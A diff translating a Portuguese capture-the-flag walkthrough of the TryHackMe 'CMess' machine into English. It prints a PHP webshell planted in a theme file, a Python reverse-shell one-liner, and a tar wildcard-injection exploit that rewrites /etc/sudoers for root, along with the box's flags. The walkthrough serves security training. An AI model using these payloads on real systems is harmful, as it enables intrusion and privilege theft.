@@ -43,14 +43,14 @@
   <p><img src="https://user-images.githubusercontent.com/77530544/171437979-f426c564-871e-40fd-bd56-910690e688b6.png" alt="Pasted image 20220601071802" /></p>
 
 <h1 id="first-steps">First steps</h1>
-<p>É pedido que adicionemos o <strong>IP da máquina</strong> ao nosso arquivo <strong>/etc/hosts</strong>:</p>
+<p>We are asked to add the <strong>MACHINE_IP cmess.thm</strong> to our <strong>/etc/hosts</strong> file:</p>
 
 <blockquote>
   <p>Please add <code class="language-plaintext highlighter-rouge">MACHINE_IP cmess.thm</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>
 Please also note that this box does not require brute forcing!</p>
 </blockquote>
 
-<p>Depois de adicionado, hora de rodar o <strong>Nmap</strong> para fins de reconhecimento:</p>
+<p>Once this is added, it’s time to run the <strong>Nmap</strong> for recon:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sC -sV cmess.thm                                                                     
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-01 07:48 -03  
@@ -75,129 +75,128 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 16.83 seconds
 </code></pre></div></div>
 
-<p>Descobrimos dois serviços, um <strong>SSH na porta 22</strong> e um <strong>servidor Apache na porta 80</strong> com <a href="https://gilacms.com/">Gila CMS</a>.</p>
+<p>We discovered two services, a <strong>SSH on port 22</strong> and an <strong>Apache server on port 80</strong> with <a href="https://gilacms.com/">Gila CMS</a>.</p>
 
-<p>Ao visitar o endereço <strong>cmess.thm</strong> somos recebidos com a página:</p>
+<p>Upon visiting the <strong>cmess.thm</strong> address we are greeted with the page:</p>
 
 <p><img src="https://user-images.githubusercontent.com/77530544/171438994-b5cfac57-add4-4fb1-a8ad-1931043a18c7.png" alt="Pasted image 20220601075329" /></p>
 
 <hr />
 
-<h1 id="primeira-flag">Primeira flag</h1>
+<h1 id="first-flag">First flag</h1>
 <blockquote>
-  <p>Compromise this machine and obtain <code class="language-plaintext highlighter-rouge">user.txt</code> <br />
+  <p>Compromise this machine and obtain <code class="language-plaintext highlighter-rouge">user.txt</code>. <br />
 <code class="language-plaintext highlighter-rouge">Hint:</code> Have you tried fuzzing for subdomains?</p>
 </blockquote>
 
-<p>Esta dica é um ótimo ponto de partida. A partir disso, vamos efetuar um <strong>fuzzing atrás de subdiretórios</strong>, e em seguida, de <strong>subdomínios</strong>.</p>
+<p>This hint is a great starting point. From here, we are going to do some <strong>fuzzing after subdirectories</strong>, and then for <strong>subdomains</strong>.</p>
 
-<p>Utilizaremos <a href="https://github.com/3ndG4me/KaliLists/blob/master/dirb/small.txt">esta wordlist</a> para efetuar os testes com a ferramenta <a href="https://github.com/xmendez/wfuzz">wfuzz</a>.</p>
+<p>We will use <a href="https://github.com/3ndG4me/KaliLists/blob/master/dirb/small.txt">this wordlist</a> for testing with the <a href="https://github.com/xmendez/wfuzz">wfuzz</a> tool.</p>
 
-<h3 id="fuzzing-de-subdiretórios">Fuzzing de subdiretórios</h3>
-<p>Com os parâmetros:</p>
+<h3 id="fuzzing-of-subdirectories">Fuzzing of subdirectories</h3>
+<p>With the parameters:</p>
 <ul>
   <li><strong>-w</strong> - wordlist</li>
-  <li><strong>-u</strong> - como agora estamos atrás de subdiretórios, a palavra “FUZZ” que indica ao software onde inserir o texto, será no final do endereço</li>
-  <li><strong>-c</strong> - output com cores</li>
-  <li><strong>–sc 200</strong> - opção para somente mostrar os resultados de <strong>códigos de status HTTP 200</strong></li>
+  <li><strong>-u</strong> - as we are now after subdirectories, the word “FUZZ” that tells the software where to insert the text, it will be at the end of the address</li>
+  <li><strong>-c</strong> - output with colors</li>
+  <li><strong>–sc 200</strong> - option to only show the results of <strong>HTTP 200 status codes</strong></li>
 </ul>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -w wordlist.txt -u http://cmess.thm/FUZZ -c --sc 200                                                                   
 ********************************************************  
-* Wfuzz 3.1.0 - The Web Fuzzer                         *  
+* Wfuzz 3.1.0 - The Web Fuzzer  
 ********************************************************  
   
 Target: http://cmess.thm/FUZZ  
 Total requests: 959  
   
 =====================================================================  
-ID           Response   Lines    Word       Chars       Payload                                                                                                 
+ID Response Lines Word Chars Payload                                                                                                 
 =====================================================================  
   
-000000006:   200        102 L    308 W      4078 Ch     "1"                                                                                                     
-000000001:   200        107 L    290 W      3851 Ch     "0"                                                                                                     
-000000003:   200        102 L    308 W      4078 Ch     "01"                                                                                                    
-000000049:   200        92 L     266 W      3353 Ch     "about"                                                                                                 
-000000059:   200        41 L     99 W       1580 Ch     "admin"                                                                                                 
-000000083:   200        0 L      0 W        0 Ch        "api"                                                                                                   
-000000133:   200        107 L    290 W      3851 Ch     "blog"                                                                                                  
-000000434:   200        107 L    290 W      3851 Ch     "index"                                                                                                 
-000000498:   200        41 L     99 W       1580 Ch     "login"                                                                                                 
-000000722:   200        107 L    290 W      3851 Ch     "search"                                                                                                
-000000818:   200        109 L    292 W      3874 Ch     "tag"                                                                                                   
+000000006: 200 102 L 308 W 4078 Ch "1"                                                                                                     
+000000001: 200 107 L 290 W 3851 Ch "0"                                                                                                     
+000000003: 200 102 L 308 W 4078 Ch "01"                                                                                                    
+000000049: 200 92 L 266 W 3353 Ch "about"                                                                                                 
+000000059: 200 41 L 99 W 1580 Ch "admin"                                                                                                 
+000000083: 200 0 L 0 W 0 Ch "api"                                                                                                   
+000000133: 200 107 L 290 W 3851 Ch "blog"                                                                                                  
+000000434: 200 107 L 290 W 3851 Ch "index"                                                                                                 
+000000498: 200 41 L 99 W 1580 Ch "login"                                                                                                 
+000000722: 200 107 L 290 W 3851 Ch "search                                                                                                
+000000818: 200 109 L 292 W 3874 Ch "tag"                                                                                                   
   
 Total time: 21.13536  
 Processed Requests: 959  
 Filtered Requests: 948  
-Requests/sec.: 45.37419
+Requests/sec: 45.37419
 </code></pre></div></div>
 
-<p>Com este resultado, podemos dar destaque a <strong>login</strong> e <strong>admin</strong>.</p>
+<p>With this result we can highlight <strong>login</strong> and <strong>admin</strong>.</p>
 
-<p>Ao visitar o endereço cmess.thm/login:</p>
+<p>When visiting cmess.thm/login:</p>
 
 <p><img src="https://user-images.githubusercontent.com/77530544/171439377-edc7256b-b905-4868-abb9-8abbbeca65b2.png" alt="Pasted image 20220601085847" /></p>
 
-<p>Sobre a página <strong>admin</strong>, como não estamos logados, o website nos retorna à página de login.</p>
+<p>About the <strong>admin</strong> page, since we are not logged in, the website returns us to the login page.</p>
 
-<h3 id="fuzzing-de-subdomínios">Fuzzing de subdomínios:</h3>
-<p>Com relação aos <strong>parâmetros</strong>:</p>
+<h3 id="fuzzing-of-subdomains">Fuzzing of subdomains:</h3>
+<p>Regarding <strong>parameters</strong>:</p>
 <ul>
-  <li><strong>-u</strong> - como agora estamos atrás de subdomínios, a palavra “FUZZ” que indica ao software onde inserir o texto vai sumir pois vamos definir isso em outro parâmetro</li>
-  <li><strong>-H “Host: FUZZ.cmess.thm”</strong> - especificando que o fuzzing será no início do endereço, atrás de subdomínios</li>
-  <li><strong>–hw 290</strong> - limpar a saída, escondendo falsos positivos, pois, dependendo de como o website é configurado, a página irá sim retornar um código 200, porém mostrando somente um erro de “Não Encontrado”</li>
-  <li><strong>–hc 400</strong> - também para limpar a saída, escondendo erros de “Bad Request”</li>
+  <li><strong>-u</strong> - as we are now after subdomains, the word “FUZZ” that tells the software where to insert the text will be gone as we will define this in another parameter</li>
+  <li><strong>-H “Host: FUZZ.cmess.thm “</strong> - specifying that the fuzzing will be at the beginning of the address, looking for subdomains</li>
+  <li><strong>–hw 290</strong> - clean up the output, hiding false positives, because depending on how the website is set up, the page will return a 200 code, but will only show a “Not Found” error</li>
+  <li><strong>–hc 400</strong> - also to clean up the output, hiding “Bad Request” errors</li>
 </ul>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -w wordlist.txt -H "Host: FUZZ.cmess.thm" -u http://cmess.thm/ -c --hw 290 --hc 400 
 
 ********************************************************  
-* Wfuzz 3.1.0 - The Web Fuzzer                         *  
+* Wfuzz 3.1.0 - The Web Fuzzer  
 ********************************************************  
   
 Target: http://cmess.thm/  
 Total requests: 959  
-  
 =====================================================================  
-ID           Response   Lines    Word       Chars       Payload                                                                                                 
+ID Response Lines Word Chars Payload                                                                                                 
 =====================================================================  
   
-000000270:   200        30 L     104 W      934 Ch      "dev"                                                                                                   
+000000270: 200 30 L 104 W 934 Ch "dev"                                                                                                   
   
 Total time: 21.96167  
 Processed Requests: 959  
 Filtered Requests: 958  
-Requests/sec.: 43.66697
+Requests/sec: 43.66697
 </code></pre></div></div>
 
-<p>A saída nos diz que existe um <strong>dev.cmess.thm</strong>, o qual vamos adicionar no nosso <strong>/etc/hosts</strong>:</p>
+<p>The output tells us that there is a <strong>dev.cmess.thm</strong>, which we will add to our <strong>/etc/hosts</strong>:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.215.52 cmess.thm dev.cmess.thm
 </code></pre></div></div>
 
-<p>Ao visitar o endereço, vemos um log com credenciais expostas:</p>
+<p>Visiting the address, we see a log with exposed credentials:</p>
 
 <p><img src="https://user-images.githubusercontent.com/77530544/171439403-c0bd8957-7c1f-4b35-a477-d25a12c73c76.png" alt="Pasted image 20220601092555" /></p>
 
-<p>Logando:</p>
+<p>Logging in:</p>
 
 <p><img src="https://user-images.githubusercontent.com/77530544/171439418-ddf03baf-9cd4-4823-af0e-946d09154ba0.png" alt="Pasted image 20220601092834" /></p>
 
-<p>Agora temos acesso à pagina <strong>admin</strong>:</p>
+<p>We now have access to the <strong>admin</strong> page:</p>
 
 <p><img src="https://user-images.githubusercontent.com/77530544/171439487-a50b88ec-319c-48d9-9e2a-182efb121d6e.png" alt="Pasted image 20220601092914" /></p>
 
-<p>Com isso, conseguimos saber a versão do <strong>Gila CMS</strong>: 1.10.9
-Obtivemos acesso à um painel de admin, com direito até a um <strong>File Manager</strong> com <strong>adição</strong>, <strong>remoção</strong> e <strong>update</strong> de arquivos:</p>
+<p>With this we get the <strong>Gila CMS</strong> version: 1.10.9
+We got access to an admin panel, with even a File Manager with file <strong>addition</strong>, <strong>removal</strong> and <strong>update</strong>:</p>
 
 <p><img src="https://user-images.githubusercontent.com/77530544/171439692-5778287d-fc1d-4c79-8f74-a2f8fb19dd8e.png" alt="Pasted image 20220601093523" />
 <img src="https://user-images.githubusercontent.com/77530544/171439723-f4b9376a-1d7a-48ec-9240-647f39d01e6b.png" alt="Pasted image 20220601093640" /></p>
 
-<p>Iremos modificar o arquivo <strong>/themes/gila-blog/header.php</strong> atrás de obter um <strong>reverse shell</strong> através de um <strong>webshell</strong>:</p>
+<p>We will modify the <strong>/themes/gila-blog/header.php</strong> file in order to get a <strong>reverse shell</strong> through a <strong>webshell</strong>:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
 &lt;?php
-system($_GET["cmd"]); # Retorna web shell que aceita input
+system($_GET["cmd"]); # Return web shell that accepts input
 view::stylesheet('lib/gila.min.css');
 view::stylesheet('lib/font-awesome/css/font-awesome.min.css');
 view::head()?&gt;
@@ -205,27 +204,27 @@ view::head()?&gt;
 [...]
 </code></pre></div></div>
 
-<p>Hora de testar o <strong>webshell</strong>, para isso vamos até <strong>cmess.thm</strong> e no final do endereço vamos adicionar “<strong>?cmd=ls</strong>”, para rodar o comando <strong>ls</strong> naquele <strong>webshell</strong>, que nos retornará uma listagem de diretório, bem no começo da página:</p>
+<p>Time to test the <strong>webshell</strong>, for that we go to <strong>cmess.thm</strong> and at the end of the address we will add “<strong>?cmd=ls</strong>”, to run the <strong>ls</strong> command on that <strong>webshell</strong>, which will return us a directory listing, right at the beginning of the page:</p>
 
 <p><img src="https://user-images.githubusercontent.com/77530544/171439769-64cffdd3-d820-4aef-bb7a-12fefc9d4fa7.png" alt="Pasted image 20220601095445" /></p>
 
-<p>Decidi usar <strong>Python</strong> para obter este <strong>reverse shell</strong>, então para isso vamos descobrir a versão que temos instalada em nosso alvo rodando <strong>“?cmd=Python3 –version”</strong>:</p>
+<p>I decided to use <strong>Python</strong> to get this <strong>reverse shell</strong>, so for that let’s find out what version we have installed on our target running <strong>“?cmd=Python3 –version”</strong>:</p>
 
 <p><img src="https://user-images.githubusercontent.com/77530544/171439809-332fb639-371a-42be-aa8d-2b4a9583c62b.png" alt="Pasted image 20220601100556" /></p>
 
-<p>Agora vamos abrir um <strong>listener</strong> em nossa máquina, que irá ficar esperando a conexão da máquina alvo.</p>
+<p>Now let’s open a <strong>listener</strong> on our machine that will wait for the connection from the target machine.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lnvvvp 6666                                                                     
 Listening on any address 6666
 </code></pre></div></div>
 
-<p>Os comandos que vamos inserir em nosso <strong>webshell</strong> agora serão um pouco mais robustos. <strong>Exemplo de reverse shell em Python com uma linha de código</strong>:<br />
-*Leitura recomendada: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</p>
+<p>The commands we are going to insert into our <strong>webshell</strong> will now be a bit more robust. <strong>Example of a Python reverse shell with one line of code</strong>:<br />
+*Recommended reading: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 </code></pre></div></div>
 
-<p>Após inserir este input na página web, em nossa máquina já temos acesso ao <strong>reverse shell</strong>:</p>
+<p>After inserting this input into the web page, on our machine we already have access to the <strong>reverse shell</strong>:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Connection from 10.10.215.52:49564  
 /bin/sh: 0: can't access tty; job control turned off  
@@ -236,54 +235,54 @@ www-data
 $
 </code></pre></div></div>
 
-<p>Subi o https://github.com/carlospolop/PEASS-ng em um servidor <strong>HTTP</strong>, baixei o <strong>linpeas.sh</strong> e concedi permissão de execução com “<strong>chmod +x linpeas.sh</strong>”.</p>
+<p>I uploaded https://github.com/carlospolop/PEASS-ng to a <strong>HTTP</strong> server, downloaded the <strong>linpeas.sh</strong> and granted execution permission with “<strong>chmod +x linpeas.sh</strong>”.</p>
 
-<p>Ao executar o arquivo, temos uma saída com inúmeras informações, porém, vamos dar ênfase a dois achados:</p>
+<p>Upon executing the file, we get an output with numerous pieces of information, however, let’s emphasize two findings:</p>
 <ul>
   <li><strong>/tmp/andre_backup.tar.gz</strong></li>
   <li><strong>/opt/.password.bak</strong></li>
 </ul>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Backup files (limited 100)  
--rw-r--r-- 1 root root 161 Jun  1 06:38 /tmp/andre_backup.tar.gz
+-rw-r--r-- 1 root root 161 Jun 1 06:38 /tmp/andre_backup.tar.gz
 [...]
--rwxrwxrwx 1 root root 36 Feb  6  2020 /opt/.password.bak
+-rwxrwxrwx 1 root root 36 Feb 6 2020 /opt/.password.bak
 [...]
 </code></pre></div></div>
 
-<p>Senha do usuário andre:</p>
+<p>Password for user andre:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /opt/.password.bak  
-andres backup password  
+andre backup password  
 UQfsdCB7aAP6
 </code></pre></div></div>
 
-<p>Conectando via <strong>ssh</strong>:</p>
+<p>Connecting via <strong>ssh</strong>:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh andre@cmess.thm  
 andre@cmess.thm's password:    
 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)  
   
-* Documentation:  https://help.ubuntu.com  
-* Management:     https://landscape.canonical.com  
-* Support:        https://ubuntu.com/advantage  
+* Documentation: https://help.ubuntu.com  
+* Management: https://landscape.canonical.com  
+* Support: https://ubuntu.com/advantage  
 Last login: Thu Feb 13 15:02:43 2020 from 10.0.0.20  
 andre@cmess:~$ ls  
-backup  user.txt
+backup user.txt
 </code></pre></div></div>
 
-<p>Nossa <strong>primeira flag</strong> se encontra dentro do arquivo <strong>user.txt</strong>:</p>
+<p>Our <strong>first flag</strong> is inside the file <strong>user.txt</strong>:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>andre@cmess:~$ cat user.txt    
 thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
 </code></pre></div></div>
 <hr />
 
-<h1 id="segunda-flag">Segunda flag</h1>
+<h1 id="second-flag">Second flag</h1>
 <p><em>Escalate your privileges and obtain <strong>root.txt</strong></em></p>
 
-<p>Lembra do arquivo <strong>/tmp/andre_backup.tar.gz</strong>?
-<strong>Cron</strong> é uma utilidade no <strong>mundo Linux</strong> para automatização de tarefas, no caso de nossa máquina alvo, analisando o <strong>/etc/crontab</strong> vemos que existe um backup do diretório <strong>/home/andre/backup</strong> sendo feito para aquele arquivo que achamos com o <strong>linpeas.sh</strong> anteriormente. Aqui, temos um exemplo de uma <strong>Wildcard Injection</strong>:</p>
+<p>Remember the <strong>/tmp/andre_backup.tar.gz</strong> file?
+<strong>Cron</strong> is a utility in the <strong>Linux world</strong> for automating tasks, in the case of our target machine, looking at <strong>/etc/crontab</strong> we see that there is a backup of the <strong>/home/andre/backup</strong> directory being done to that file we found with <strong>linpeas.sh</strong> earlier. Here we have an example of a <strong>Wildcard Injection</strong>:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>andre@cmess:~/backup$ cat /etc/crontab  
 # /etc/crontab: system-wide crontab  
@@ -295,46 +294,46 @@ thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
 SHELL=/bin/sh  
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin  
   
-# m h dom mon dow user  command  
-17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly  
-25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )  
-47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )  
-52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )  
-*/2 *   * * *   root    cd /home/andre/backup &amp;&amp; tar -zcf /tmp/andre_backup.tar.gz *
+# m h dom mon dow user command  
+17 * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly  
+25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )  
+47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )  
+52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )  
+*/2 * * * root cd /home/andre/backup &amp;&amp; tar -zcf /tmp/andre_backup.tar.gz *
 </code></pre></div></div>
 
-<p><strong>Por que</strong> isso caracteriza uma vunerabilidade de <strong>Wildcard Injection</strong>?</p>
+<p><strong>Why</strong> is this a <strong>Wildcard Injection</strong> vulnerability?</p>
 
-<p>A <strong>última entrada</strong> do <strong>output</strong> de nosso <strong>cat</strong> nos diz que:
-A cada <strong>2 minutos</strong>, através do usuário <strong>root</strong>, <strong>TODOS</strong> (indicado pelo <strong>asterísco</strong>) os arquivos na pasta <strong>/home/andre/backup</strong> são comprimidos em um <strong>tar</strong>, que então é enviado até o diretório <strong>/tmp/</strong></p>
+<p>The <strong>last entry</strong> of the <strong>output</strong> of our <strong>cat</strong> tells us that:
+Every <strong>2 minutes</strong>, via the <strong>root</strong> user, <strong>ALL</strong> (indicated by <strong>asterisk</strong>) the files in the <strong>/home/andre/backup</strong> folder are compressed into a <strong>tar</strong>, which is then sent to the <strong>/tmp/</strong> directory</p>
 
-<p>Podemos explorar isso e obter privilégio <strong>root</strong> inserindo aqui um <strong>código malicioso</strong> que irá <strong>remover a necessidade do usuário andre de fornecer uma senha ao executar o programa sudo</strong>. Este código será executado pelo nosso <strong>cron</strong>:</p>
+<p>We can exploit this and obtain <strong>root</strong> privilege by inserting some <strong>malicious code</strong> here that will <strong>remove the need for the andre user to provide a password when running the sudo program</strong>. This code will be executed by our <strong>cron</strong>:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>andre@cmess:~/backup$ echo 'echo "andre ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers' &gt; safeprogram.sh  
 andre@cmess:~/backup$ echo "" &gt; "--checkpoint-action=exec=sh safeprogram.sh"  
 andre@cmess:~/backup$ echo "" &gt; --checkpoint=1
 andre@cmess:~/backup$ ls -l  
 total 16  
--rw-rw-r-- 1 andre andre  1 Jun  1 07:59 --checkpoint=1  
--rw-rw-r-- 1 andre andre  1 Jun  1 07:59 --checkpoint-action=exec=sh safeprogram.sh  
--rwxr-x--- 1 andre andre 51 Feb  9  2020 note  
--rw-rw-r-- 1 andre andre 53 Jun  1 07:58 safeprogram.sh
+-rw-rw-r-- 1 andre andre 1 Jun 1 07:59 --checkpoint=1  
+-rw-rw-rw-- 1 andre andre 1 Jun 1 07:59 --checkpoint-action=exec=sh safeprogram.sh  
+-rwxr-x--- 1 andre andre 51 Feb 9 2020 note  
+-rw-rw-r-- 1 andre andre 53 Jun 1 07:58 safeprogram.sh
 </code></pre></div></div>
 
-<p>Passado dois minutos, este é o retorno de nosso <strong>sudo -l</strong>:</p>
+<p>After two minutes, this is the return from our <strong>sudo -l</strong>:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>andre@cmess:~/backup$ sudo -l  
 User andre may run the following commands on cmess:  
    (root) NOPASSWD: ALL
 </code></pre></div></div>
 
-<p>E a partir disso, conseguimos <strong>root</strong> sem sequer inserir a senha:</p>
+<p>And from that we get <strong>root</strong> without even entering the password:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>andre@cmess:~/backup$ sudo bash  
 root@cmess:~/backup#
 </code></pre></div></div>
 
-<p>Na pasta <strong>/root</strong> encontramos nossa <strong>segunda flag</strong>:</p>
+<p>In the <strong>/root</strong> folder we find our <strong>second flag</strong>:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@cmess:~/backup# cd /root  
 root@cmess:/root# ls  
